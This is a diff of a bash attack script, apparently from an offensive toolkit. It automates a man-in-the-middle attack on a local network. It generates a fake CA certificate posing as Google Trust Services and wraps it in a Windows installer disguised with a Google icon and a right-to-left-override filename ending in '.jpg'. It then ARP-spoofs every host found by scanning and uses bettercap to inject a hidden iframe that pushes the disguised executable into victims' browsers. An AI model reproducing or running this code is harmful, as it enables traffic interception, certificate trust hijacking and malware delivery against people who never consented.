@@ -51,7 +51,7 @@ color_print() { printf "${!1}%b${RESET}\n" "$2"; }
 
 WINEARCH=win64 wineboot --init
 WINEPREFIX="$HOME/.wine"
-MITM_DIR="/tmp/mitm"
+MITM_DIR="/usr/share/bettercap/caplets/unk9vvn"
 RTLO=$'\xE2\x80\xAE'
 BUILD_DIR="$WINEPREFIX/drive_c/pyinstaller-build"
 ICON_URL="https://9to5google.com/wp-content/client-mu-plugins/9to5-core/includes/obfuscate-images/images/9to5google-default.jpg"
@@ -92,13 +92,12 @@ GATEWAY=$(ip route | awk '/^default/ {print $3; exit}')
 color_print YELLOW "[*] Cleaning old files..."
 rm -rf "$MITM_DIR" "$BUILD_DIR"
 rm -f /var/www/html/*
-mkdir -p "$MITM_DIR" "$BUILD_DIR"
+mkdir -p "$MITM_DIR" "$BUILD_DIR" "$CA_DIR"
 
 # ========================
 # --- GENERATE FAKE CERTIFICATE ---
 # ========================
 color_print CYAN "[*] Generating fake certificate..."
-mkdir -p "$CA_DIR"
 openssl genrsa -out "$CA_KEY" 4096
 openssl req -x509 -new -nodes \
     -key "$CA_KEY" \
@@ -106,7 +105,6 @@ openssl req -x509 -new -nodes \
     -days 3650 \
     -out "$CA_CERT_PEM" \
     -subj "/C=US/ST=California/L=Mountain View/O=Google LLC/OU=Google Trust Services/CN=Google Internet Authority G3"
-
 openssl x509 -outform der -in "$CA_CERT_PEM" -out "$CA_CERT_CER"
 
 # ========================
@@ -122,7 +120,7 @@ convert "$MITM_DIR/google.jpg" -define icon:auto-resize=256,128,96,64,48,32,16 "
 color_print GREEN "[*] Building Windows installer..."
 CERT_B64=$(base64 -w0 "$CA_CERT_CER")
 
-cat > "$MITM_DIR/cert-installer.py" <<EOF
+cat > "$MITM_DIR/cert_installer.py" <<EOF
 import os, subprocess, tempfile, base64
 
 CERT_B64 = """$CERT_B64"""
@@ -143,7 +141,7 @@ except FileNotFoundError:
 EOF
 
 cd "$BUILD_DIR"
-cp "$MITM_DIR/cert-installer.py" "$BUILD_DIR/cert_installer.py"
+cp "$MITM_DIR/cert_installer.py" "$BUILD_DIR/cert_installer.py"
 cp "$MITM_DIR/google.ico" "$BUILD_DIR/google.ico"
 
 wine pyinstaller --onefile --noconfirm --noconsole \
@@ -185,9 +183,10 @@ service apache2 restart
 color_print CYAN "[*] Scanning network..."
 TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups 2>/dev/null | \
     awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}' | \
-    grep -v "$LAN" | sort -u | paste -sd ',' -)
+    grep -v -E "^($LAN|$GATEWAY)$" | \
+    sort -u | paste -sd ',' -)
 
-cat > "$MITM_DIR/hook.js" <<EOF
+cat > "$MITM_DIR/rtlo_downloader.js" <<EOF
 const iframe = document.createElement('iframe');
 iframe.src = 'http://$LAN/google-update${RTLO}gpj.exe';
 iframe.width = '0';
@@ -196,7 +195,7 @@ iframe.style.display = 'none';
 document.body.appendChild(iframe);
 EOF
 
-cat > "/usr/share/bettercap/cert_injector.cap" <<EOF
+cat > "$MITM_DIR/cert_injector.cap" <<EOF
 # ARP spoofing config
 set arp.spoof.internal true
 arp.spoof on
@@ -206,8 +205,8 @@ set https.proxy.certificate ${CA_CERT_PEM}
 set https.proxy.key ${CA_KEY}
 
 # Hook injection scripts
-set http.proxy.script ${MITM_DIR}/hook.js
-set https.proxy.script ${MITM_DIR}/hook.js
+set http.proxy.script ${MITM_DIR}/rtlo_downloader.js
+set https.proxy.script ${MITM_DIR}/rtlo_downloader.js
 
 # Enable HTTP & HTTPS proxies
 http.proxy on
@@ -234,7 +233,7 @@ EOF
 # --- LAUNCH BETTERCAP ---
 # ========================
 color_print GREEN "[*] Launching Bettercap..."
-sudo bettercap -iface "$IFACE" -eval "set arp.spoof.targets $TARGETS" -caplet "/usr/share/bettercap/cert_injector.cap"
+bettercap -iface "$IFACE" -caplet "$MITM_DIR/cert_injector.cap" -eval "set arp.spoof.targets $TARGETS"
 ```
 
 _Run & Execute_
